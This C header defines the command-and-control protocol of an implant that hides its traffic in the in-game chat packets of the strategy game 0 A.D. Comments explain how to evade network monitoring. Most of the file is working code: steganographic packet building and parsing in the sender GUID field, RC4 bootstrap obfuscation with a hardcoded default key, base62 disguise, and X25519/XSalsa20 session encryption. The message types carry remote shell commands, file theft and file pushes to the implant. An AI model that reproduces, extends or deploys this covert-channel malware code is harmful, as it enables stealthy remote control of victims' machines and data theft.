/*
 * c2_proto.h — 0adC2 protocol v6  ("Ghost Chat")
 *
 * ── Overview ────────────────────────────────────────────────────────────
 * This file defines the entire Command & Control (C2) protocol used by the
 * implant. The C2 hides inside the legitimate network traffic of the real-time
 * strategy game "0 A.D." — specifically inside NMT_CHAT (in-game chat) packets.
 * To a network observer (Wireshark, IDS), the traffic looks like players chatting.
 *
 * ── Protocol lifecycle ───────────────────────────────────────────────────
 * 1. The agent (implant) joins a 0AD multiplayer game hosted by the C2 server.
 * 2. It sends a KA (Keep-Alive) beacon encrypted with a static RC4 key —
 *    this is the "bootstrap" phase before a proper key exchange.
 * 3. The controller sends a DH packet containing its X25519 public key.
 * 4. Both sides compute a shared session key (ECDH) — now all traffic is
 *    encrypted with XSalsa20-Poly1305, a modern authenticated cipher.
 * 5. The controller sends CMD packets; the agent replies with RSP packets.
 *    File transfers use DL/UL/DLRQ; bespoke control uses CTL.
 *
 * V6 changes vs V5 :
 *   - ECDH X25519 (libsodium) → per-agent session key
 *     (previously a single static key shared by all agents — a single capture
 *      would expose all communications)
 *   - RC4 → XSalsa20-Poly1305 (crypto_secretbox) after DH handshake
 *     (RC4 is cryptographically broken; secretbox provides authentication too)
 *   - New type V4_DH (U+2062) : ctrl→agent pubkey
 *   - RSP streaming : no MAX_OUTPUT buffer on the agent side
 *     · tot=0 for all chunks except the last
 *     · tot=seq on the last one → ctrl flushes upon reception
 *     (allows streaming large command outputs without buffering everything first)
 *   - Extended RSP header : aid8 + jid4 + seq4 + tot4 + enc(data)
 *     · jid=0 reserved for system messages (DH_OK, jobs, etc.)
 *   - Bootstrap (before DH) : RC4+static_key for KA only
 *   - After DH : all cmd/rsp/ctl/dl/ul go through secretbox+session_key
 *
 * ── Wire format of a C2 NMT_CHAT packet ─────────────────────────────────
 * The C2 data rides inside the GUID/sender field of the chat message, NOT in
 * the visible text. The visible text is a random "cover message" (e.g. "gg!").
 *
 *   [U+XXXX (type, invisible)][noise4][champs base62]
 *
 *   Type  Unicode codepoint   Fields (base62-encoded)
 *   CMD   U+200B              tok8 + tgt + secretbox(cmd)
 *   RSP   U+200C              aid8 + jid4 + seq4 + tot4 + secretbox(chunk)
 *   KA    U+200D              tok8 + aid8 + pub64 + rc4_static(sysinfo)
 *   DLRQ  U+2060              tok8 + tgt + phsh8 + secretbox(path)
 *   DL    U+200E              aid8 + phsh8 + seq4 + tot4 + secretbox(data)
 *   UL    U+200F              tok8 + tgt + phsh8 + seq4 + tot4 + secretbox(payload)
 *   CTL   U+2061              tok8 + tgt + secretbox(ctl)
 *   DH    U+2062              tok8 + T+aid8 + ctrl_pub64  (unencrypted, pubkey exchange)
 *
 *   pub64  = v4_eb(pubkey[32])  → 64 chars b62 (ephemeral X25519 public key)
 *
 *   Field size notation: tok8 = 8 base62 chars (encodes u32 token),
 *   aid8 = 8 chars (agent ID), jid4 = 4 chars (job ID), etc.
 */

#pragma once
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* ── NMT message types ──────────────────────────────────────────────────
 * NMT = "Network Message Type" — these are the real packet types used by
 * the 0 A.D. game engine (Pyrogenesis). Each number is the first byte of
 * an ENet reliable packet on the game's TCP-like channel.
 *
 * The C2 only injects data into NMT_CHAT (type 6) packets because:
 *   - Chat messages are frequent and normal (not suspicious)
 *   - The sender GUID field is never shown in the game UI → ideal hiding spot
 *   - Other types (FILE_TRANSFER, etc.) are only sent during specific game
 *     events and would look anomalous if injected randomly
 *
 * These values are taken directly from 0AD source:
 *   source/network/NetMessage.h
 */
#define NMT_SERVER_HANDSHAKE          1
#define NMT_CLIENT_HANDSHAKE          2
#define NMT_SERVER_HANDSHAKE_RESPONSE 3
#define NMT_AUTHENTICATE              4
#define NMT_AUTHENTICATE_RESULT       5
#define NMT_CHAT                      6   /* ← C2 traffic hidden here */
#define NMT_FILE_TRANSFER_REQUEST    12
#define NMT_FILE_TRANSFER_RESPONSE   13
#define NMT_FILE_TRANSFER_DATA       14
#define NMT_FILE_TRANSFER_ACK        15
#define NMT_JOIN_SYNC_START          16
#define NMT_REJOINED                 17
#define NMT_CLIENTS_LOADING          21
#define NMT_LOADED_GAME              23
#define NMT_GAME_START               24
#define NMT_PING                      9
#define NMT_PONG                     10
#define NMT_END_COMMAND_BATCH        26
#define MAGIC_CLIENT  0x50630121u       /* magic bytes a 0AD client sends in CLIENT_HANDSHAKE */

/* ── Type markers (zero-width Unicode codepoints) ───────────────────────
 * These Unicode codepoints are "invisible" characters (zero-width joiners,
 * word joiners, etc.). When embedded in a UTF-8 string they produce no
 * visible glyph — they are used inside the GUID/sender field of chat packets
 * as a type discriminator.
 *
 * However, in V6 the type is NOT embedded as a raw Unicode codepoint in the
 * GUID field (that would be non-printable and suspicious). Instead, the type
 * byte maps to a letter 'g'-'n' via the _V4_TYPE_BASE scheme (see below).
 * These V4_* constants are kept as the canonical names for each message type
 * and used in the _v4_tc_idx reverse table for parsing.
 */
#define V4_CMD    0x200Bu   /* command: controller → agent (execute shell cmd, etc.) */
#define V4_RSP    0x200Cu   /* response: agent → controller (output of a command) */
#define V4_KA     0x200Du   /* keep-alive beacon: agent → controller (I'm alive + sysinfo) */
#define V4_DLRQ   0x2060u   /* download request: controller → agent (ask agent to upload a file) */
#define V4_DL     0x200Eu   /* download data: agent → controller (file chunk) */
#define V4_UL     0x200Fu   /* upload data: controller → agent (push a file to agent) */
#define V4_CTL    0x2061u   /* control message: controller → agent (special commands) */
#define V4_DH     0x2062u   /* V6: ECDH key exchange — controller sends its X25519 pubkey */

/* ── Big-Endian primitives ──────────────────────────────────────────────
 * The 0AD network protocol uses big-endian (network byte order) for all
 * multi-byte integers. These helpers write/read integers into/from a raw
 * byte buffer, advancing a position offset by returning the number of bytes
 * consumed. All x86 machines are little-endian, so we must byte-swap manually.
 *
 * wu8/wu16/wu32 : write unsigned int into buffer, return bytes written
 * ru16/ru32     : read unsigned int from buffer (no bounds check — caller's job)
 */
static inline size_t wu8 (uint8_t *b, uint8_t  v){ b[0]=v;return 1;}
static inline size_t wu16(uint8_t *b, uint16_t v){ b[0]=v>>8;b[1]=v&0xff;return 2;}
static inline size_t wu32(uint8_t *b, uint32_t v){
    b[0]=(v>>24)&0xff;b[1]=(v>>16)&0xff;b[2]=(v>>8)&0xff;b[3]=v&0xff;return 4;}
static inline uint16_t ru16(const uint8_t *b){return ((uint16_t)b[0]<<8)|b[1];}
static inline uint32_t ru32(const uint8_t *b){
    return((uint32_t)b[0]<<24)|((uint32_t)b[1]<<16)|((uint32_t)b[2]<<8)|b[3];}

/* wcstr : write a Pascal-style "counted string" — 4-byte length prefix + raw bytes.
 * This is the 0AD wire format for variable-length strings (UTF-8 narrow strings). */
static inline size_t wcstr(uint8_t *b, const char *s){
    uint32_t n=s?(uint32_t)strlen(s):0;wu32(b,n);
    if(n) memcpy(b+4,s,n);return 4+n;}
/* rcstr : read a counted string from a buffer with bounds checking.
 * Returns number of bytes consumed (4 + string length), or 0 on error. */
static inline size_t rcstr(const uint8_t *b, size_t blen, char *out, size_t outsz){
    if(blen<4){if(outsz)out[0]='\0';return 0;}
    uint32_t n=ru32(b);
    if(4+n>blen||n>=outsz){if(outsz)out[0]='\0';return 0;}
    memcpy(out,b+4,n);out[n]='\0';return 4+n;}

/* wcstrw : write a "wide" (UTF-16 BE) counted string WITHOUT the 4-byte length prefix.
 * 0AD stores player names as UTF-16 in network byte order (big-endian):
 * each ASCII char becomes a 2-byte sequence 0x00 + char (high byte first).
 * Used only in NMT_AUTHENTICATE for the player name field. */
static inline size_t wcstrw(uint8_t *b, const char *s){
    size_t n=s?strlen(s):0;
    for(size_t i=0;i<n;i++){b[i*2]=0x00;b[i*2+1]=(uint8_t)s[i];}
    b[n*2]=0x00;b[n*2+1]=0x00;return n*2+2;}

/* mk_pkt : build a complete 0AD ENet packet in the output buffer.
 * Format: [type(1)] [total_length(2)] [payload(plen)]
 * The 'total_length' field includes the 3-byte header itself.
 * Returns the total number of bytes written (= 3 + plen). */
static inline size_t mk_pkt(uint8_t *out, uint8_t type,
                             const uint8_t *pl, size_t plen){
    uint16_t tot=(uint16_t)(3+plen);
    wu8(out,type);wu16(out+1,tot);
    if(plen) memcpy(out+3,pl,plen);return tot;}

/* ── RC4 (bootstrap only — used before ECDH handshake) ─────────────────
 * Why RC4 here?
 *   RC4 is a stream cipher: it XORs plaintext with a pseudo-random keystream
 *   derived from a key. It is cryptographically broken (biased keystream,
 *   known plaintext attacks) and should never be used for real encryption.
 *
 *   Here it serves a single, limited purpose: obfuscating the initial KA
 *   (keep-alive) beacon BEFORE the ECDH handshake has taken place. At that
 *   point there is no session key yet, so we use a pre-shared static key
 *   compiled into both the agent and the controller. This is acceptable
 *   because:
 *     1. The KA only contains low-sensitivity system info (OS, hostname)
 *     2. It is replaced by XSalsa20-Poly1305 immediately after DH completes
 *     3. The game traffic already provides cover — we just need obfuscation,
 *        not perfect confidentiality at this stage
 *
 * How RC4 works (KSA + PRGA):
 *   - Key Scheduling Algorithm (KSA): shuffles a 256-byte state table S[]
 *     using the key, mixing each byte with the corresponding key byte.
 *   - Pseudo-Random Generation Algorithm (PRGA): iterates over S[] using two
 *     indices i and j, swapping elements to generate one keystream byte at a
 *     time. Each plaintext byte is XOR'd with one keystream byte.
 *   - Encryption = Decryption (symmetric XOR stream)
 */
typedef struct{uint8_t S[256];uint8_t i,j;}RC4Ctx;
static inline void rc4_init(RC4Ctx *r, const char *key){
    size_t klen=strlen(key);
    if(!klen){key="0adC2DefaultKey";klen=15;}  /* empty key → fallback to hardcoded default */
    for(int i=0;i<256;i++) r->S[i]=(uint8_t)i;  /* initialize S-box to identity */
    r->i=r->j=0;uint8_t jj=0;
    /* KSA: mix the S-box using the key */
    for(int i=0;i<256;i++){
        jj=(uint8_t)(jj+r->S[i]+((const uint8_t*)key)[i%klen]);
        uint8_t t=r->S[i];r->S[i]=r->S[jj];r->S[jj]=t;}}
static inline uint8_t rc4_byte(RC4Ctx *r){
    /* PRGA: generate one keystream byte by swapping and mixing */
    r->i++;r->j=(uint8_t)(r->j+r->S[r->i]);
    uint8_t t=r->S[r->i];r->S[r->i]=r->S[r->j];r->S[r->j]=t;
    return r->S[(uint8_t)(r->S[r->i]+r->S[r->j])];}
static inline void rc4_crypt(const char *key, uint8_t *buf, size_t len){
    /* XOR each byte with the next keystream byte — same function for enc/dec */
    RC4Ctx r;rc4_init(&r,key);
    for(size_t i=0;i<len;i++) buf[i]^=rc4_byte(&r);}

/* ── FNV-1a hash ────────────────────────────────────────────────────────
 * FNV-1a (Fowler–Noll–Vo) is a fast, non-cryptographic hash function.
 * Here it is used to deterministically derive a GUID from a player name so
 * that every connection with the same name produces the same GUID — mimicking
 * how a real 0AD client would behave (it always sends the same persistent GUID).
 * The magic constants (0x811c9dc5 = offset basis, 0x01000193 = FNV prime)
 * are fixed by the FNV-1a specification for 32-bit output.
 */
static inline uint32_t fnv32(const char *s){
    uint32_t h=0x811c9dc5u;
    for(const char *p=s;*p;p++){h^=(uint8_t)*p;h*=0x01000193u;}
    return h;}

/* ── Base62 encoding ────────────────────────────────────────────────────
 * Why Base62 instead of Base64?
 *   Base64 uses characters [A-Za-z0-9+/=]. The '+', '/' and '=' characters
 *   are NOT alphanumeric and would stand out in a player GUID (which looks
 *   like a UUID hex string "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx").
 *   Base62 uses only [0-9a-zA-Z] — every character looks like it could
 *   plausibly appear in a GUID, making the encoded C2 data visually
 *   indistinguishable from legitimate game traffic at first glance.
 *
 * How it works:
 *   - Alphabet has 62 characters (10 digits + 26 lowercase + 26 uppercase)
 *   - Each byte (0-255) is encoded as TWO base62 chars: quotient and remainder
 *     of (byte / 62). Max value is 61*62 + 61 = 3843 > 255, so this always fits.
 *   - This is NOT standard base64-style bit-packing; it's a simpler byte-by-byte
 *     encoding that doubles the output size (1 byte → 2 chars) for simplicity.
 *
 * The v4_b62r[] reverse lookup table maps char → digit (255 = invalid char).
 *
 * Encoding functions:
 *   v4_e4(o, v)  : encode u32 as 8 base62 chars (big-endian digit order)
 *   v4_e2(o, v)  : encode u16 as 4 base62 chars
 *   v4_eb(o, in, n) : encode n raw bytes as 2n base62 chars (byte-by-byte)
 *
 * Decoding functions:
 *   v4_d4(s)     : decode 8 base62 chars → u32
 *   v4_d2(s)     : decode 4 base62 chars → u16
 *   v4_db(o, s, &len) : decode base62 string → raw bytes, returns -1 on error
 */
static const char V4_B62[63]=
    "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
static uint8_t v4_b62r[256];   /* reverse table: ASCII char → base62 digit, 0xFF = invalid
                                 * Size 256 covers the full uint8_t range — any byte from
                                 * untrusted network data is safe to use as an index. */
static int     v4_b62_ok=0;    /* init flag: 1 if v4_b62r has been populated */
static inline void v4_b62_init(void){
    if(v4_b62_ok) return;
    memset(v4_b62r,0xFF,sizeof(v4_b62r));  /* mark everything as invalid first */
    for(int i=0;i<62;i++) v4_b62r[(uint8_t)V4_B62[i]]=(uint8_t)i;  /* fill valid chars */
    v4_b62_ok=1;}

/* v4_e4 : encode a 32-bit value as 8 base62 characters (big-endian, rightmost digit first) */
static inline void v4_e4(char *o, uint32_t v){
    for(int i=7;i>=0;i--){o[i]=V4_B62[v%62];v/=62;}}
/* v4_d4 : decode 8 base62 characters back to a 32-bit value */
static inline uint32_t v4_d4(const char *s){
    v4_b62_init();uint32_t v=0;
    for(int i=0;i<8;i++) v=v*62+v4_b62r[(uint8_t)s[i]];
    return v;}
/* v4_e2 : encode a 16-bit value as 4 base62 characters */
static inline void v4_e2(char *o, uint16_t v){
    for(int i=3;i>=0;i--){o[i]=V4_B62[v%62];v/=62;}}
/* v4_d2 : decode 4 base62 characters back to a 16-bit value */
static inline uint16_t v4_d2(const char *s){
    v4_b62_init();uint16_t v=0;
    for(int i=0;i<4;i++) v=v*62+v4_b62r[(uint8_t)s[i]];
    return v;}

/* v4_eb : encode n raw bytes as 2n base62 chars.
 * Each byte b → two chars: V4_B62[b/62] V4_B62[b%62]
 * Output is null-terminated at position 2n. */
static inline void v4_eb(char *o, const uint8_t *in, size_t n){
    v4_b62_init();
    for(size_t i=0;i<n;i++){o[2*i]=V4_B62[in[i]/62];o[2*i+1]=V4_B62[in[i]%62];}
    o[2*n]='\0';}
/* v4_db : decode a base62 string back to raw bytes.
 * Returns 0 on success with *outlen = number of decoded bytes, -1 on error.
 * Fails if: odd-length input, invalid characters, or decoded value > 255. */
static inline int v4_db(uint8_t *o, const char *s, size_t *outlen){
    v4_b62_init();size_t n=strlen(s);
    if(n&1) return -1;  /* each byte needs exactly 2 chars; odd length = corrupt */
    *outlen=n/2;
    for(size_t i=0;i<*outlen;i++){
        int h=v4_b62r[(uint8_t)s[2*i]],l=v4_b62r[(uint8_t)s[2*i+1]];
        if(h==0xFF||l==0xFF) return -1;  /* non-base62 character = corrupt or not C2 */
        int v=h*62+l;if(v>255) return -1;  /* value overflow (theoretical, but checked) */
        o[i]=(uint8_t)v;}
    return 0;}

/* ── RC4 + Base62 combined encode/decode (bootstrap phase only) ─────────
 * These functions are ONLY used for the initial KA (keep-alive) beacon,
 * before the ECDH handshake produces a session key.
 *
 * v4_enc : plaintext → RC4(key, plaintext) → base62 string
 *   1. Copy plaintext to a temporary buffer
 *   2. XOR it in-place with RC4 keystream (encrypts it)
 *   3. Encode the encrypted bytes as base62
 *   Returns the number of base62 chars written (= plen * 2)
 *
 * v4_dec_raw : base62 string → decode bytes → RC4 decrypt → raw bytes
 * v4_dec     : same but null-terminates the output (for string fields)
 *   Returns number of plaintext bytes, or -1 on error (bad base62, overflow)
 */
static inline size_t v4_enc(char *out, const char *key, const void *plain, size_t plen){
    if(!plen){out[0]='\0';return 0;}
    uint8_t *tmp=(uint8_t*)malloc(plen);if(!tmp) return 0;
    memcpy(tmp,plain,plen);rc4_crypt(key,tmp,plen);  /* encrypt in-place */
    v4_eb(out,tmp,plen);free(tmp);return plen*2;}     /* then base62-encode */
static inline ssize_t v4_dec_raw(uint8_t *out, size_t outsz,
                                  const char *key, const char *b62){
    size_t n=0;
    if(v4_db(out,b62,&n)<0||n>outsz) return -1;  /* base62-decode first */
    rc4_crypt(key,out,n);return(ssize_t)n;}        /* then RC4-decrypt */
static inline ssize_t v4_dec(char *out, size_t outsz,
                               const char *key, const char *b62){
    if(!outsz) return -1;
    ssize_t n=v4_dec_raw((uint8_t*)out,outsz-1,key,b62);
    if(n>=0) out[n]='\0';return n;}  /* add null terminator for convenience */

/* ── NMT_CHAT steganography ────────────────────────────────────────────
 * "Steganography" means hiding a secret message inside an innocent-looking
 * carrier. Here the carrier is a chat message in the game 0 A.D.
 *
 * ── Why this field? ──
 * A legitimate NMT_CHAT packet contains two string fields:
 *   1. GUID (sender ID): a UUID like "3f2a1b8c-0d4e-..."  — NEVER shown in UI
 *   2. Text (message body): "gg!", "rush mid!", etc.    — VISIBLE to players
 *
 * The C2 data goes into field 1 (GUID), which no player or spectator ever sees.
 * Field 2 contains a convincing random "cover message" taken from V4_NOISE
 * (real game chat phrases). An observer watching the game screen sees nothing.
 *
 * ── Previous scheme (V4, deprecated) ──
 *   Type + data were embedded in the message body using noise words:
 *   "wallinf1eco1cav1<base62>" — suspicious because no player types that pattern.
 *
 * ── Current scheme ──
 *   NMT_CHAT wire format:
 *     [cstr  GUID ] = [type_char(1 byte)] + [body base62 encoded data]
 *     [cstrw TEXT ] = cover_msg in UTF-16  ← what players see: "good game!", "go!", ...
 *
 *   type_char: a single letter from 'g' to 'n' (8 possible types).
 *   Why 'g'-'n'? Because real 0AD GUIDs are hex UUIDs (chars 0-9, a-f only).
 *   Letters 'g' through 'n' are OUTSIDE the hex range → guaranteed no collision
 *   with any legitimate player GUID. A simple range check [g..n] instantly
 *   identifies a C2 packet vs. real player traffic.
 *
 *   type_char mapping (type_char & 0x7):
 *     0→'g'=DLRQ  1→'h'=CTL  2→'i'=DH   3→'j'=CMD
 *     4→'k'=RSP   5→'l'=KA   6→'m'=DL   7→'n'=UL
 *
 *   Example — what Wireshark shows for a KA packet:
 *     GUID field (raw bytes): "l0x3aK4fB9mR2p..." (type 'l'=KA + base62 payload)
 *     Text field (decoded):   "good game!"         (cover message, visible in game)
 *
 * Cover messages are drawn from OBF_MSGS (obfuscated pool, decoded at runtime),
 *   not from a static array — see gen_agent_str.py / obf_agent_strings.h.
 */

/* _V4_TYPE_BASE: the base ASCII value for the type indicator character.
 * 'g' = 103 decimal. Adding 0-7 gives 'g'-'n'. All are outside hex range
 * (hex uses 0-9 and a-f only, so 'g' and above are never in a real UUID). */
#define _V4_TYPE_BASE 'g'   /* 'g'=0 … 'n'=7 */

/* _v4_tc_idx: reverse lookup table.
 * Index = (type_char - 'g'), value = the corresponding V4_* constant.
 * Used by v4_parse() to convert the first GUID character back to a type. */
static const uint16_t _v4_tc_idx[8]={
    V4_DLRQ,V4_CTL,V4_DH,V4_CMD,V4_RSP,V4_KA,V4_DL,V4_UL};

/* ── v4_build : assemble a C2-carrying NMT_CHAT packet ─────────────────
 * This is the core steganography function. It builds a complete 0AD chat
 * packet where the secret C2 data is smuggled inside the sender GUID field.
 *
 * Parameters:
 *   pkt       : output buffer (must be at least 8400 bytes)
 *   type_char : one of V4_CMD, V4_RSP, V4_KA, etc.
 *   noise_idx : ignored (was used in V4 for body noise words — kept for ABI)
 *   body      : base62-encoded C2 payload (already encrypted by caller)
 *   cover     : the visible chat message (e.g. "good game!")
 *
 * Wire layout produced:
 *   NMT_CHAT header (3 bytes)
 *   + GUID field (cstr = 4-byte length + content):
 *       content = [type letter 'g'-'n'] + [base62 payload]
 *   + Text field (UTF-16 BE encoded cover string, null terminated)
 *
 * Returns total packet length in bytes.
 */
static inline size_t v4_build(uint8_t *pkt, uint16_t type_char,
                               int noise_idx, const char *body,
                               const char *cover){
    (void)noise_idx;
    uint8_t pl[8400];size_t off=0;

    /* GUID/sender field: [type indicator letter] + [base62 encoded C2 data]
     * E.g. for a KA packet: "l0x3aK4fB9mR..." — the 'l' encodes type V4_KA.
     * A real player GUID looks like "3f2a1b8c-0d4e-..." — starts with hex digits,
     * NEVER with a letter >= 'g'. This is how the receiver identifies C2 packets. */
    char guid[8200];
    guid[0]=(char)(_V4_TYPE_BASE+(int)(type_char&0x7u));  /* type indicator: 'g'-'n' */
    strncpy(guid+1,body?body:"",sizeof(guid)-2);           /* payload follows immediately */
    guid[sizeof(guid)-1]='\0';
    off+=wcstr(pl+off,guid);

    /* Message text field: the cover message, encoded as UTF-16 BE (0x00 + char).
     * This is what players/spectators see in the game chat window.
     * The loop manually expands each ASCII char to 2 bytes, then appends a
     * 2-byte null terminator (UTF-16 null = 0x0000). */
    const char *cm=cover?cover:"gg";
    for(const char *s=cm;*s;s++){pl[off]=0x00;pl[off+1]=(uint8_t)*s;off+=2;}
    pl[off]=0x00;pl[off+1]=0x00;off+=2;   /* UTF-16 null terminator */

    return mk_pkt(pkt,NMT_CHAT,pl,off);}

/* ── v4_parse : detect and parse a C2-carrying NMT_CHAT packet ──────────
 * Called on every received packet to determine if it is C2 traffic.
 *
 * Parameters:
 *   d, dl    : raw packet buffer and its length
 *   body     : output buffer for the base62 payload (caller decodes/decrypts it)
 *   body_sz  : size of the output buffer
 *
 * Returns: the V4_* type constant (e.g. V4_KA, V4_CMD...) if it is a C2 packet,
 *          or 0 if it is a legitimate chat message (not C2).
 *
 * How it works:
 *   1. Check packet type byte: must be NMT_CHAT (6)
 *   2. Read the 4-byte length prefix of the GUID field
 *   3. Check the very first byte of the GUID content:
 *      - If it's in ['g'..'n'] → C2 packet, look up type in _v4_tc_idx
 *      - Otherwise → real player chat, ignore it
 *   4. Extract the body (GUID bytes 1..end) into the output buffer
 *      The body is still base62-encoded and encrypted at this point.
 */
static inline uint16_t v4_parse(const uint8_t *d, size_t dl,
                                  char *body, size_t body_sz){
    if(dl<3||d[0]!=NMT_CHAT) return 0;   /* not even a chat packet */
    const uint8_t *pl=d+3,*end=d+dl;     /* skip the 3-byte NMT header */
    if(pl+4>end) return 0;
    uint32_t slen=ru32(pl);              /* 4-byte length prefix of the GUID string */
    if(slen<1||pl+4+slen>end) return 0;
    uint8_t first=(uint8_t)pl[4];       /* first byte of the GUID content */
    /* Range check: 'g'=103 to 'n'=110. Real UUIDs only use 0-9 and a-f (max 102).
     * Anything outside ['g'..'n'] is a legitimate chat message — return 0. */
    if(first<(uint8_t)_V4_TYPE_BASE||first>(uint8_t)(_V4_TYPE_BASE+7)) return 0;
    uint16_t tc=_v4_tc_idx[first-_V4_TYPE_BASE];   /* map letter to V4_* type */
    /* Body: GUID bytes [1..slen-1], which is the base62-encoded C2 payload */
    size_t blen=slen>1?slen-1:0;
    if(blen>=body_sz) blen=body_sz-1;   /* truncate to fit output buffer */
    memcpy(body,pl+5,blen);             /* pl+4 = first byte (type), pl+5 = payload start */
    body[blen]='\0';
    return tc;}  /* return the V4_* constant so caller knows what to do with the body */

/* ── V6 : XSalsa20-Poly1305 authenticated encryption + X25519 ECDH ─────
 * Requires libsodium. Only compiled when C2_USE_SODIUM is defined.
 *
 * This replaces the RC4 bootstrap encryption for all traffic AFTER the DH
 * key exchange. XSalsa20-Poly1305 ("secretbox") provides:
 *   - Confidentiality via XSalsa20 stream cipher (256-bit key)
 *   - Authentication via Poly1305 MAC (16 bytes)
 *   → Tampering with a ciphertext is detected and rejected.
 *
 * Key exchange uses X25519 (ECDH on Curve25519):
 *   - Each agent generates an ephemeral key pair (priv/pub) per session
 *   - The controller sends its pubkey in a V4_DH packet
 *   - Both sides compute the same 32-byte shared secret from their own
 *     private key and the peer's public key (Diffie-Hellman)
 *   - The session key is then derived with SHA-256 to bind it to both
 *     parties (prevents key confusion attacks)
 */
#ifdef C2_USE_SODIUM
#include <sodium.h>

/* v6_enc : encrypt plaintext with secretbox, then base62-encode for wire.
 *
 * Wire layout (binary before base62):
 *   [nonce(24 bytes)] [MAC(16 bytes) + ciphertext(plen bytes)]
 *   Total binary size: 24 + 16 + plen bytes → 2*(24+16+plen) base62 chars
 *
 * The nonce is generated fresh randomly for each message (using libsodium's
 * randombytes_buf which reads from /dev/urandom). A unique nonce per message
 * is critical for XSalsa20 security — reusing a nonce with the same key
 * breaks confidentiality completely.
 *
 * Returns: number of base62 chars written (= total_binary_size * 2)
 */
static inline size_t v6_enc(char *out, const uint8_t key32[32],
                              const void *plain, size_t plen){
    size_t clen  = crypto_secretbox_MACBYTES + plen;   /* MAC(16) + ciphertext */
    size_t total = crypto_secretbox_NONCEBYTES + clen; /* nonce(24) + MAC + ciphertext */
    uint8_t *buf = (uint8_t*)malloc(total);
    if(!buf){out[0]='\0';return 0;}
    randombytes_buf(buf, crypto_secretbox_NONCEBYTES);  /* random nonce at start */
    /* crypto_secretbox_easy: encrypts in-place and prepends a 16-byte MAC.
     * The MAC covers both the ciphertext and the nonce (implicit in the call). */
    crypto_secretbox_easy(buf + crypto_secretbox_NONCEBYTES,
                          (const uint8_t*)plain, plen,
                          buf,    /* nonce */
                          key32); /* session key */
    v4_eb(out, buf, total);  /* base62-encode the whole nonce+MAC+ciphertext blob */
    free(buf);
    return total * 2;}

/* v6_dec_raw : base62-decode, then verify MAC and decrypt.
 * Returns plaintext length on success, -1 if:
 *   - base62 decode fails (corrupt data, not C2)
 *   - MAC verification fails (tampered or wrong key)
 *   - Output buffer too small
 */
static inline ssize_t v6_dec_raw(uint8_t *out, size_t outsz,
                                   const uint8_t key32[32], const char *b62){
    size_t enclen = strlen(b62);
    if(enclen & 1) return -1;                           /* odd length = corrupt */
    size_t blen   = enclen / 2;
    size_t min    = crypto_secretbox_NONCEBYTES + crypto_secretbox_MACBYTES;  /* 24+16=40 */
    if(blen <= min) return -1;   /* too short to contain even an empty message */
    uint8_t *buf  = (uint8_t*)malloc(blen);
    if(!buf) return -1;
    size_t n;
    if(v4_db(buf, b62, &n) < 0 || n != blen){free(buf);return -1;}
    size_t ptlen = blen - min;   /* expected plaintext length */
    if(ptlen > outsz){free(buf);return -1;}
    /* crypto_secretbox_open_easy: verifies MAC first, then decrypts.
     * Returns -1 if MAC is invalid → we return -1 to caller (not C2 or tampered). */
    int r = crypto_secretbox_open_easy(
                out,
                buf + crypto_secretbox_NONCEBYTES,   /* MAC+ciphertext start */
                blen - crypto_secretbox_NONCEBYTES,  /* MAC+ciphertext length */
                buf,     /* nonce (first 24 bytes) */
                key32);  /* session key */
    free(buf);
    return r == 0 ? (ssize_t)ptlen : -1;}

/* v6_dec : same as v6_dec_raw but null-terminates the output for string use */
static inline ssize_t v6_dec(char *out, size_t outsz,
                               const uint8_t key32[32], const char *b62){
    if(!outsz) return -1;
    ssize_t n = v6_dec_raw((uint8_t*)out, outsz-1, key32, b62);
    if(n >= 0) out[n] = '\0';
    return n;}

/* v6_derive_session : derive the shared session key from the ECDH exchange.
 *
 * Why not use the raw Diffie-Hellman shared secret directly as the key?
 *   The raw X25519 output (crypto_scalarmult_curve25519) is a group element,
 *   not a uniformly random key. Additionally, both sides need to agree on
 *   WHICH party is agent and WHICH is controller to avoid key confusion.
 *   Hashing with both public keys as context solves both issues:
 *
 *   session_key = SHA-256(X25519(our_priv, peer_pub) || agent_pub || ctrl_pub)
 *
 *   Both agent and controller compute the same shared_secret (DH property),
 *   both hash with the same two public keys (in the same order) → same session_key.
 *   An attacker who captures the pubkeys cannot compute the session_key without
 *   one of the private keys.
 *
 * The shared Diffie-Hellman secret is zeroed after use (sodium_memzero) to
 * prevent it from leaking via memory forensics or core dumps.
 */
static inline int v6_derive_session(uint8_t session_key[32],
                                     const uint8_t our_priv[32],
                                     const uint8_t peer_pub[32],
                                     const uint8_t agent_pub[32],
                                     const uint8_t ctrl_pub[32]){
    uint8_t shared[crypto_scalarmult_BYTES];  /* raw X25519 output (32 bytes) */
    /* Perform ECDH: shared = our_priv * peer_pub (Curve25519 scalar multiplication) */
    if(crypto_scalarmult_curve25519(shared, our_priv, peer_pub) != 0) return -1;
    /* Concatenate shared || agent_pub || ctrl_pub for SHA-256 input */
    uint8_t concat[crypto_scalarmult_BYTES + 64];
    memcpy(concat,                              shared,    crypto_scalarmult_BYTES);
    memcpy(concat + crypto_scalarmult_BYTES,    agent_pub, 32);
    memcpy(concat + crypto_scalarmult_BYTES+32, ctrl_pub,  32);
    crypto_hash_sha256(session_key, concat, sizeof(concat));  /* hash → 32-byte key */
    sodium_memzero(shared, sizeof(shared));  /* wipe DH secret from memory */
    return 0;}

#endif /* C2_USE_SODIUM */

/* ── 0AD game handshake ─────────────────────────────────────────────────
 * Only compiled when C2_IMPLEMENT_HANDSHAKE is defined.
 * Requires libenet (the UDP game networking library used by 0AD).
 *
 * This section implements the complete 0AD multiplayer connection handshake,
 * allowing the agent to join a game lobby as a legitimate-looking player.
 * The state machine mirrors the real 0AD client code:
 *
 *   state 0: wait for NMT_SERVER_HANDSHAKE (server announces itself)
 *     → send NMT_CLIENT_HANDSHAKE (echo back engine/mod info + magic bytes)
 *   state 1: wait for NMT_SERVER_HANDSHAKE_RESPONSE (server accepts us)
 *     → send NMT_AUTHENTICATE (player name + deterministic GUID)
 *   state 2: wait for NMT_AUTHENTICATE_RESULT (code 1=joined, 2=observer)
 *     → may receive NMT_FILE_TRANSFER_* (server syncing game state)
 *   state 3: consume file transfer chunks, send NMT_FILE_TRANSFER_ACK per chunk
 *     → when transfer done, send NMT_LOADED_GAME (signal ready to play)
 *   state 4: wait for NMT_LOADED_GAME from server (all players ready)
 *     → send NMT_REJOINED (join confirmed)
 *
 * Once the handshake completes (return 0), the agent can exchange NMT_CHAT
 * packets containing the C2 protocol payload.
 */
